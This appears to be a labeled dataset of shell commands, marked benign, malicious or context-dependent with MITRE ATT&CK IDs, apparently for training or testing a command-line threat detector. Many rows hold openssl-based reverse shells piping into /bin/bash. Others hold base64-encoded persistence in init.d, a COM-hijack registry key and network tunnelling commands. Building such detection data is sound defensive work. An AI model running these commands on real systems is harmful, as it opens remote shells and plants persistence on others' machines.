command,label,original_label,mitre_id
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8443,Malicious,Synthetic,Synthetic
pg_restore [-c|--clean] [-d|--dbname] db_name archive_file.dump,Benign,Benign,Benign
mongod --config path/to/file,Benign,Benign,Benign
go doc -all -src encoding/json,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
tcpdump -i eth0 dst 192.168.1.254,Context_Dependent,Synthetic,Synthetic
zsteg --all path/to/image.bmp,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
i2cdump i2cbus device_address,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:4445,Malicious,Synthetic,Synthetic
tcpdump -i any -n -c 9090,Context_Dependent,Synthetic,Synthetic
ghcup set ghc version,Benign,Benign,Benign
"""c:\Program Files\Wireshark\tshark.exe"" -i $interface -c 5",Context_Dependent,Malicious,T1040
log stream --process process_id,Benign,Benign,Benign
kdesrc-build component_name,Benign,Benign,Benign
homeshick generate castle_name,Benign,Benign,Benign
jenv global java_version,Benign,Benign,Benign
pkgutil --pkgs,Benign,Benign,Benign
ssh -w 0:0 support@10.0.0.100,Context_Dependent,Synthetic,Synthetic
audtool current-song,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:1433,Malicious,Synthetic,Synthetic
"{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);",Malicious,Malicious,T1573
reg compare key_name1 key_name2 /os,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:993,Malicious,Synthetic,Synthetic
HAL9TH,Malicious,Malicious,T1497
trust anchor path/to/certificate.crt,Benign,Benign,Benign
env | sed 's/;/\\;/g',Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:9002,Malicious,Synthetic,Synthetic
sudo lvreduce [-L|--size] -40G [-r|--resizefs] logical_volume,Benign,Benign,Benign
net group /domain,Context_Dependent,Malicious,T1069
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:9002,Malicious,Synthetic,Synthetic
find /home -type d ! -exec test -e '{}/bin' \; -print,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:5432,Malicious,Synthetic,Synthetic
tcpdump -i wlan0 port 1433,Context_Dependent,Synthetic,Synthetic
bpytop -m,Benign,Benign,Benign
bshell --vnc,Benign,Benign,Benign
pacstrap path/to/new_root base linux linux-firmware,Benign,Benign,Benign
sysctl kernel.hostname,Context_Dependent,Synthetic,Synthetic
ls -lR / | tee -a output.file,Benign,Benign,Benign
zint --types,Benign,Benign,Benign
smbutil view -g //$computer_name,Context_Dependent,Malicious,T1135
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:1433,Malicious,Synthetic,Synthetic
npm [ln|link],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:8081,Malicious,Synthetic,Synthetic
duplicity --full-if-older-than 1M s3://bucket_name[/prefix],Benign,Benign,Benign
SeImpersonate,Malicious,Malicious,T1134
LOCALAPPDATA%\MicroSoft Updatea\uplog.tmp,Malicious,Malicious,T1074
"minisign -Sm path/to/file -c ""Untrusted comment"" -t ""Trusted comment""",Benign,Benign,Benign
tail -20 /etc/netplan/01-netcfg.yaml,Context_Dependent,Synthetic,Synthetic
dcg,Benign,Benign,Benign
pnmtopalm [-c|-colormap] path/to/file.pnm > path/to/file.palm,Benign,Benign,Benign
bundle exec command arguments,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:993 backup@192.168.1.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
ionic g page,Benign,Benign,Benign
kill [-9|-KILL] process_id,Benign,Benign,Benign
"kdialog --warningyesnocancel ""message""",Benign,Benign,Benign
combine path/to/file1 not path/to/file2,Benign,Benign,Benign
"sudo chcat CategoryName1,CategoryName2,... path/to/file",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:53 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
gh help subcommand,Benign,Benign,Benign
dbx configure --profile DEFAULT,Benign,Benign,Benign
"$storageAccountObjects | Format-Table -Property ResourceGroup, StorageAccountName, FileShareName, ContainerName, BlobName, TableName, QueueName -AutoSize -Wrap",Context_Dependent,Malicious,T1619
aircrack-ng -p number -w path/to/wordlist.txt path/to/capture.cap,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.1:443 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
lvmdump -d path/to/directory,Benign,Benign,Benign
todo edit --location location_name task_id,Benign,Benign,Benign
ssh -w 0:0 audit@10.0.0.5,Context_Dependent,Synthetic,Synthetic
conky [-c|--config] path/to/config,Benign,Benign,Benign
az acr repository delete [-n|--name] registry_name --repository image_name:tag,Benign,Benign,Benign
ausyscall architecture --dump,Benign,Benign,Benign
pwd | awk -F / '{print $NF}',Benign,Benign,Benign
isosize [-x|--sectors] path/to/file.iso,Benign,Benign,Benign
portageq get_repos /,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
"grim ""path/to/file.png""",Benign,Benign,Benign
chkrootkit -r path/to/directory,Benign,Benign,Benign
tp.Attributes = SE_PRIVILEGE_ENABLED;,Malicious,Malicious,T1562
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:9002,Malicious,Synthetic,Synthetic
soupault --config config_path --site-dir input_directory --build-dir output_directory,Benign,Benign,Benign
"find . -type f -name '*.java' -exec sh -c 'iconv -f cp1252 -t utf-8 ""$1"" > converted && mv converted ""$1""' -- {} \;",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:4444,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.50:995 postgres@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
gh browse [-s|--settings],Benign,Benign,Benign
gcc path/to/source.c -Wall [-o|--output] output_executable,Benign,Benign,Benign
cat path/to/file | aspell list,Benign,Benign,Benign
localectl list-keymaps,Benign,Benign,Benign
az tag add-value [-n|--name] tag_name --value tag_value,Benign,Benign,Benign
chmod o= path/to/file,Benign,Benign,Benign
sshuttle -r user@10.10.10.50 0/0,Context_Dependent,Synthetic,Synthetic
find . -type f -exec ls -lrt {} \; |awk -F' ' '{print $9}',Benign,Benign,Benign
pio check,Benign,Benign,Benign
systemctl is-active sshd,Context_Dependent,Synthetic,Synthetic
tcpdump -i eth0 host 192.168.1.10,Context_Dependent,Synthetic,Synthetic
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \"" "" >> /etc/init.d/T1543.002",Malicious,Malicious,T1543
pg_basebackup [-h|--host] host [-D|--pgdata] path/to/backup_dir [-P|--progress],Benign,Benign,Benign
xbacklight -set 100 -time 60000 -steps 60,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
schtasks /create /sc,Malicious,Malicious,T1053
piactl get regions,Benign,Benign,Benign
"textql -dlm=delimiter -header -sql ""SELECT * FROM filename"" path/to/filename.csv",Benign,Benign,Benign
"echo ""[Install]"" >> $path_to_systemd_service",Malicious,Malicious,T1053
etcd,Benign,Benign,Benign
"fuzzel [-o|--output] ""DP-1""",Benign,Benign,Benign
ssh -fN -L 8080:172.20.10.8:9001 backup@files.company.local,Context_Dependent,Synthetic,Synthetic
xo --fix,Benign,Benign,Benign
curl file:///path/to/temp-file -o /path/to/output-file,Malicious,Malicious,T1222
rpmbuild -bb path/to/spec_file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:53 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:8081,Malicious,Synthetic,Synthetic
cmd.exe /c del,Malicious,Malicious,T1070
reg load key_name path\to\file.hiv,Benign,Benign,Benign
md5sum $(which cc),Benign,Benign,Benign
"docker [ps|container ls] [-f|--filter] ""exited=code"" [-a|--all]",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9090,Malicious,Synthetic,Synthetic
tldr sniff.py,Benign,Benign,Benign
par2 create -r1..100 -- path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3389,Malicious,Synthetic,Synthetic
tldr snap.pkg,Benign,Benign,Benign
xdg-open .,Benign,Benign,Benign
"lsns [-o|--output] NS,TYPE,PID,COMMAND",Benign,Benign,Benign
aws backup delete-backup-plan --backup-plan-id id,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:445,Malicious,Synthetic,Synthetic
gdrive download id,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:110,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:172.16.0.10:80 deploy@192.168.0.50,Context_Dependent,Synthetic,Synthetic
cake cache clear_all,Benign,Benign,Benign
strace -p 1234,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:993,Malicious,Synthetic,Synthetic
EnumCalendarInfoExW,Malicious,Malicious,T1106
gcloud sql export sql instance gs://bucket_name/file_name --async,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:3389,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:443 deploy@10.20.30.40,Context_Dependent,Synthetic,Synthetic
"FOLDERS=$(find . -type d | paste -d, -s)",Benign,Benign,Benign
dotnet publish [-o|--output] path/to/directory path/to/project_file,Benign,Benign,Benign
serverless logs [-t|--tail],Benign,Benign,Benign
tmux kill-session -t name,Benign,Benign,Benign
dysk [-f|--filter] 'use > 65% | free < 50G',Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:995,Malicious,Synthetic,Synthetic
pageres https://example.com/ 1366x768 --hide='.page-header',Benign,Benign,Benign
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f",Malicious,Malicious,T1546
ssh -fN -L 8080:192.168.1.100:80 root@10.0.0.50,Context_Dependent,Synthetic,Synthetic
diff -q <(sort set1) <(sort set2),Benign,Benign,Benign
cdparanoia 3 'path/to/file.wav',Benign,Benign,Benign
sudo semanage login [-m|--modify] [-s|--seuser] selinux_user linux_username,Benign,Benign,Benign
"find . -name "".DS_STORE"" -delete",Benign,Benign,Benign
watch -d ls -l,Benign,Benign,Benign
sshuttle -r user@10.0.0.1 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
ssh-copy-id -i path/to/certificate username@remote_host,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:4445,Malicious,Synthetic,Synthetic
pcapfix --deep-scan path/to/file.pcap,Benign,Benign,Benign
stat /etc/exports,Context_Dependent,Synthetic,Synthetic
supervisorctl tail -100 process_name stderr,Benign,Benign,Benign
"surfraw -print elvi_name ""search_terms""",Benign,Benign,Benign
secrethub write --clip path/to/secret,Benign,Benign,Benign
nth [-t|--text] 5f4dcc3b5aa765d61d8327deb882cf99,Benign,Benign,Benign
bc --expression 'scale = 10; 5 / 3',Benign,Benign,Benign
systemd-stdio-bridge,Benign,Benign,Benign
find . -name \*.php -type f -exec grep -Hn '$test' {} \; | wc -l,Benign,Benign,Benign
netsh advfirewall firewall,Context_Dependent,Malicious,T1518
WNetEnumResourceW,Context_Dependent,Malicious,T1135
idea path/to/directory,Benign,Benign,Benign
pulumi policy enable organization_name/policy_pack_name latest|version,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:143,Malicious,Synthetic,Synthetic
sysctl fs.file-nr,Context_Dependent,Benign,Benign
mssqlclient.py -k domain/username@target,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
pct [cr|create] 100 local:vztmpl/distro-name.tar.zst --rootfs local-lvm:4 --start,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:5432,Malicious,Synthetic,Synthetic
redis-benchmark -q,Benign,Benign,Benign
ssh -fN -L 8080:172.16.5.20:80 postgres@files.company.local,Context_Dependent,Synthetic,Synthetic
readonly variable_name=value,Benign,Benign,Benign
nmap $host_to_scan,Context_Dependent,Malicious,T1046
mumble mumble://username@example.com,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
ng [n|new] project_name,Benign,Benign,Benign
sort foo.txt,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:8081,Malicious,Synthetic,Synthetic
[[ $(find /path/to/file -type f -size +51200c 2>/dev/null) ]] && echo true || echo false,Benign,Benign,Benign
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,Malicious,Malicious,T1564
C:\\Windows\\Temp\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK,Malicious,Malicious,T1074
tcpdump -i ens33 port 143,Context_Dependent,Synthetic,Synthetic
uuencode -o path/to/output_file path/to/input_file output_file_name_after_decoding,Benign,Benign,Benign
"find ""$some_directory"" -type f -name '.*' -delete",Benign,Benign,Benign
find /path/to/search -xtype l,Benign,Benign,Benign
"top -p `pgrep process-name | tr ""\\n"" "","" | sed 's/,$//'`",Benign,Benign,Benign
ip address dhcp,Benign,Benign,Benign
resolvectl service _service._protocol name,Benign,Benign,Benign
gem install gem_name [-v|--version] 1.0.0,Benign,Benign,Benign
"semver 1.2.3 --range ""^1.0""",Benign,Benign,Benign
shfmt [-i|--indent] 4 path/to/file,Benign,Benign,Benign
pngcrush -rem allb -brute -reduce in.png out.png,Benign,Benign,Benign
i3-msg command,Benign,Benign,Benign
cs complete-dep group_id,Benign,Benign,Benign
lli -O3 path/to/file.ll,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:53 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:143,Malicious,Synthetic,Synthetic
xinput reattach id master_id,Benign,Benign,Benign
keyctl add type_keyring key_name key_value target_keyring,Benign,Benign,Benign
tcpdump -i ens33 port 1433,Context_Dependent,Synthetic,Synthetic
pnmtops [-imagew|-imagewidth] imagewidth [-imageh|-imageheight] imageheight path/to/file.pnm > path/to/file.ps,Benign,Benign,Benign
gh issue [new|create] [-F|--body-file] path/to/file,Benign,Benign,Benign
kernel32!GetTickCountKernel32,Malicious,Malicious,T1497
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
find . -iname '*.jpg' -type f -printf +%b,Benign,Benign,Benign
"for dir in $(find -depth -type d); do [[ ! $prev =~ $dir ]] && echo ""$dir"" ; prev=""$dir""; done",Benign,Benign,Benign
stripe logs tail,Benign,Benign,Benign
"xcowsay ""hello, world""",Benign,Benign,Benign
"find ""$searchpath"" -name ""$filepat.[ch]"" -exec grep --color -aHn ""$greppattern"" {} \;",Benign,Benign,Benign
( awk 'NR % 2' input; awk 'NR % 2 == 0' input ) | paste - - - | column -s' ' -t,Benign,Benign,Benign
sudo blockdev --setra 128 /dev/sdXY,Benign,Benign,Benign
sudo usermod [-s|--shell] path/to/shell username,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:6379,Malicious,Synthetic,Synthetic
"echo ""ExecStart=$execstart_action"" >> $systemd_service_path/$systemd_service_file",Malicious,Malicious,T1543
